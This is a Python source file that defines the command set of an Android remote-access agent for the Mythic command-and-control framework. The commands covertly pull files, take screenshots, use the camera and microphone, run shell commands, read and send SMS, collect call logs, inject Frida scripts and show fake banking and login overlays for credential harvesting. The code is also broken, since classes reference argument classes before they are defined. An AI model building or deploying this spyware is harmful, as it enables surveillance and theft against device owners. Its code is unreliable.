#!/usr/bin/env python3
"""
Eris Android Agent - Individual Command Classes
Defines individual command classes for Mythic 3.3 compatibility
"""

from mythic_payloadtype_container import *
import json
import base64
import asyncio
from pathlib import Path

# Base classes for command definitions
class CommandBase:
    """Base class for all Eris commands"""
    pass

class TaskArguments:
    """Base class for task argument parsing"""
    def __init__(self, command_line, **kwargs):
        self.command_line = command_line
        self.args = []
        
    def add_arg(self, name, value):
        setattr(self, name, value)

# File System Commands
class LsCommand(CommandBase):
    cmd = "ls"
    needs_admin = False
    help_cmd = "List directory contents with optional path and hidden file display"
    description = "List files and directories in the specified path"
    version = 1
    supported_ui_features = ["file_browser"]
    author = "@RedTeam"
    argument_class = LsArguments
    attackmapping = ["T1083"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class LsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="Directory path to list",
                default_value=".",
                required=False
            ),
            CommandParameter(
                name="show_hidden",
                type=ParameterType.Boolean,
                description="Show hidden files",
                default_value=False,
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("path", ".")
            self.add_arg("show_hidden", False)
        else:
            parts = self.command_line.split(" ")
            self.add_arg("path", parts[0])
            self.add_arg("show_hidden", "-a" in parts or "--all" in parts)

class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "Download a file from the device to the Mythic server"
    description = "Transfer files from the Android device to the operator"
    version = 1
    supported_ui_features = ["file_browser"]
    author = "@RedTeam"
    argument_class = DownloadArguments
    attackmapping = ["T1005", "T1041"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="File path to download",
                required=True
            ),
            CommandParameter(
                name="chunk_size",
                type=ParameterType.Number,
                description="Download chunk size in bytes",
                default_value=1024000,
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Missing required parameter: path")
        
        parts = self.command_line.split(" ")
        self.add_arg("path", parts[0])
        if len(parts) > 1:
            try:
                chunk_size = int(parts[1])
                self.add_arg("chunk_size", chunk_size)
            except ValueError:
                self.add_arg("chunk_size", 1024000)
        else:
            self.add_arg("chunk_size", 1024000)

class UploadCommand(CommandBase):
    cmd = "upload"
    needs_admin = False
    help_cmd = "Upload a file from the Mythic server to the device"
    description = "Transfer files from the operator to the Android device"
    version = 1
    supported_ui_features = ["file_browser"]
    author = "@RedTeam"
    argument_class = UploadArguments
    attackmapping = ["T1105"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class UploadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="remote_path",
                type=ParameterType.String,
                description="Remote file path on device",
                required=True
            ),
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="File to upload",
                required=True
            ),
            CommandParameter(
                name="permissions",
                type=ParameterType.String,
                description="File permissions (octal)",
                default_value="644",
                required=False
            )
        ]

    async def parse_arguments(self):
        # File upload parameters will be handled by the UI
        pass

# Surveillance Commands  
class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "Take a screenshot of the device screen"
    description = "Capture the current device screen with quality and format options"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = ScreenshotArguments
    attackmapping = ["T1113"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="quality",
                type=ParameterType.Number,
                description="Image quality (1-100)",
                default_value=80,
                required=False
            ),
            CommandParameter(
                name="format",
                type=ParameterType.ChooseOne,
                choices=["png", "jpg", "webp"],
                description="Image format",
                default_value="png",
                required=False
            ),
            CommandParameter(
                name="display_id",
                type=ParameterType.Number,
                description="Display ID for multi-screen devices",
                default_value=0,
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("quality", 80)
            self.add_arg("format", "png")
            self.add_arg("display_id", 0)

class CameraCommand(CommandBase):
    cmd = "camera"
    needs_admin = False
    help_cmd = "Capture a photo using device camera"
    description = "Take photos using front or back camera with quality settings"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = CameraArguments
    attackmapping = ["T1125"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class CameraArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="camera_id",
                type=ParameterType.Number,
                description="Camera ID (0=back, 1=front)",
                default_value=0,
                required=False
            ),
            CommandParameter(
                name="quality",
                type=ParameterType.Number,
                description="Photo quality (1-100)",
                default_value=80,
                required=False
            ),
            CommandParameter(
                name="flash",
                type=ParameterType.Boolean,
                description="Use camera flash",
                default_value=False,
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("camera_id", 0)
            self.add_arg("quality", 80)
            self.add_arg("flash", False)

class MicrophoneCommand(CommandBase):
    cmd = "microphone"
    needs_admin = False
    help_cmd = "Record audio using device microphone"
    description = "Capture audio recordings with duration and quality settings"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = MicrophoneArguments
    attackmapping = ["T1123"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class MicrophoneArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                type=ParameterType.Number,
                description="Recording duration in seconds",
                default_value=10,
                required=False
            ),
            CommandParameter(
                name="quality",
                type=ParameterType.ChooseOne,
                choices=["low", "medium", "high"],
                description="Audio quality",
                default_value="high",
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("duration", 10)
            self.add_arg("quality", "high")

# System Commands
class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "Execute a shell command on the device"
    description = "Run system commands with timeout support"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = ShellArguments
    attackmapping = ["T1059", "T1059.004"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Shell command to execute",
                required=True
            ),
            CommandParameter(
                name="timeout",
                type=ParameterType.Number,
                description="Command timeout in seconds",
                default_value=30,
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Missing required parameter: command")
        
        self.add_arg("command", self.command_line)
        self.add_arg("timeout", 30)

# Communication Commands
class SmsCommand(CommandBase):
    cmd = "sms"
    needs_admin = False
    help_cmd = "Access SMS messages - list, send, or delete"
    description = "Interact with device SMS messages and send new ones"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = SmsArguments
    attackmapping = ["T1430"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class SmsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "send", "delete"],
                description="SMS action to perform",
                default_value="list",
                required=False
            ),
            CommandParameter(
                name="limit",
                type=ParameterType.Number,
                description="Maximum number of messages to retrieve",
                default_value=100,
                required=False
            ),
            CommandParameter(
                name="phone_number",
                type=ParameterType.String,
                description="Phone number (for send action)",
                required=False
            ),
            CommandParameter(
                name="message",
                type=ParameterType.String,
                description="Message text (for send action)",
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("action", "list")
            self.add_arg("limit", 100)

class CallLogCommand(CommandBase):
    cmd = "call_log"
    needs_admin = False
    help_cmd = "Retrieve call log history from the device"
    description = "Access device call history with filtering options"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = CallLogArguments
    attackmapping = ["T1430"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class CallLogArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="limit",
                type=ParameterType.Number,
                description="Maximum number of call logs to retrieve",
                default_value=100,
                required=False
            ),
            CommandParameter(
                name="call_type",
                type=ParameterType.ChooseOne,
                choices=["all", "incoming", "outgoing", "missed"],
                description="Type of calls to retrieve",
                default_value="all",
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("limit", 100)
            self.add_arg("call_type", "all")

# Advanced Commands
class FridaCommand(CommandBase):
    cmd = "frida"
    needs_admin = False
    help_cmd = "Execute Frida JavaScript code for runtime manipulation"
    description = "Run Frida scripts against target processes for dynamic analysis"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = FridaArguments
    attackmapping = ["T1055"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class FridaArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="script",
                type=ParameterType.String,
                description="Frida JavaScript code to execute",
                required=True
            ),
            CommandParameter(
                name="target_process",
                type=ParameterType.String,
                description="Target process name or PID",
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Missing required parameter: script")

class OverlayCommand(CommandBase):
    cmd = "overlay"
    needs_admin = False
    help_cmd = "Create overlay windows for credential harvesting"
    description = "Generate fake login overlays for social engineering"
    version = 1
    supported_ui_features = []
    author = "@RedTeam"
    argument_class = OverlayArguments
    attackmapping = ["T1056.003", "T1185"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

class OverlayArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="type",
                type=ParameterType.ChooseOne,
                choices=["login", "banking", "social", "custom"],
                description="Overlay type",
                default_value="login",
                required=False
            ),
            CommandParameter(
                name="target_app",
                type=ParameterType.String,
                description="Target application package name",
                required=False
            ),
            CommandParameter(
                name="html_content",
                type=ParameterType.String,
                description="Custom HTML content for overlay",
                required=False
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("type", "login")
